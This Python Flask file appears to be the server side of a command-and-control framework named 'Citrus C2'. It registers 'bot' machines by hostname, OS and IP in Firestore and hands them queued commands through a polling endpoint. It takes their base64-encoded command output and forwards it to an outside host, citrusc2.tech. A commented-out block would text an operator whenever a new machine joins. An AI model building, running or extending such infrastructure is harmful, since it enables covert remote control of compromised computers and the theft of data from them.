from flask import jsonify, request, Blueprint

import firebase_admin
from firebase_admin import credentials, firestore

import uuid
import base64
import time
import datetime

from . import routes
import requests

# from twilio.rest import Client

# from dotenv import load_dotenv
import os
import string

client_api = Blueprint('client_api', __name__)
# load_dotenv()

#Twilio
account_sid = os.getenv('twilio_account_sid')
auth_token  = os.getenv('twilio_auth_token')
# client = Client(account_sid, auth_token)

# Firestore/Firebase Stuff
cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred)
db = firestore.client()

@routes.route('/bot/register/<string:os>/<string:hostname>', methods=['POST'])
def index(os, hostname):
    id = str(uuid.uuid4())

    db.collection('machines').add({
        'uuid': id,
        'ip': request.headers.get('X-Real-IP'),
        'hostname': hostname,
        'poll_rate': 5,
        'tasks': [],
        'os': os
    })

    # message = client.messages.create(
    #     to="+17148512888", 
    #     from_="+12185208855",
    #     body=f"\n=Citrus C2 Notification: New {string.capwords(os)} Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
    # )
    return {'uuid': id}




@routes.route('/bot/poll', methods=['GET', 'POST'])
def poll():
    machines = db.collection('machines').where(
        'uuid', '==', request.headers.get('uuid')).limit(1).get()

    if not machines:
        return {'Error': 'No machines found'}

    machine = machines[0]
    tasks = machine.to_dict()['tasks']

    if tasks:
        task = tasks.pop(0)
        machine.reference.update({'tasks': tasks})
        return {'task': task}

    return ({'task': None}, 418)


@routes.route('/bot/allinfo/', methods=['GET'])
def info():
    machines = db.collection('machines').get()

    res = []

    for x in machines:
        print(x.to_dict())
        tmp = {}
        tmp['hostname'] = x.to_dict()['hostname']
        tmp['uuid']=x.to_dict()['uuid']
        tmp['ip']=x.to_dict()['ip']
        tmp['os']=x.to_dict()['os']
        res.append(tmp)
    return jsonify(res)


@routes.route('/bot/hostinfo/<string:input_uuid>', methods=['GET'])
def hostinfo(input_uuid):
    machines = db.collection('machines').where('uuid', '==', input_uuid).limit(1).get()
    if not machines:
        return {'Error': 'No machines found'} #a57a2176-1447-4311-a94b-8c9235ea580f
    machine = machines[0]
    return machine.to_dict()



@routes.route('/bot/push', methods=['POST'])
def push():
    machines = db.collection('machines').where(
        'uuid', '==', request.headers.get('uuid')).limit(1).get()

    if not machines:
        print(dict(request.headers))
        return {'Error': 'No machines found'}

    machine = machines[0]
    tasks = machine.to_dict()['tasks']

    tasks.append(request.headers.get('task'))
    print("Task Gotten: " + request.headers.get('task'))
    machine.reference.update({'tasks': tasks})

    return {'success': True}

@routes.route('/stats', methods=['GET'])
def stats():
    machines = db.collection('machines').get()

    if not machines:
        return {"error": "there appear to be no machines added, how can you get stats with no machines lol"}
    
    res = {}
    count = 0
    res['machine_count'] = len(machines)
    for x in machines:
        count += len(x.to_dict()['tasks'])
    res['scheduled_tasks_count'] = count

    return res

@routes.route('/cmdout/<string:input_encoding>', methods=['POST', 'GET']) 
def cmdoutput(input_encoding):
    #l = request.form.keys()
    #output = ""
    #output = output.join(l)
    #print(dict(request.headers))
    padding_to_readd = int(input_encoding[-1])
    input_encoding = input_encoding[:-1]
    input_encoding = input_encoding + ("=" * padding_to_readd)
    base64_bytes = input_encoding.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    #print("CMDOUTPUT: " + message)
    r = requests.post('http://citrusc2.tech/out', data={'output': message, 'uuid': request.headers['Uuid']})


    machines = db.collection('machines').where(
        'uuid', '==', request.headers.get('Uuid')).limit(1).get()

    presentDate = datetime.datetime.now()
    unix_timestamp = datetime.datetime.timestamp(presentDate)*1000
    
    if not machines:
        db.collection('cmd_hist').add({
            'uuid': request.headers['Uuid'],
            'history': [{
                "cmd_output": message,
                "timestamp": unix_timestamp
            }]
        })
    else:
        machine = machines[0]
        history = machine.to_dict()['history']
        history.append({
                "cmd_output": message,
                "timestamp": unix_timestamp
            })
        machine.reference.update({'history': history})
    return message
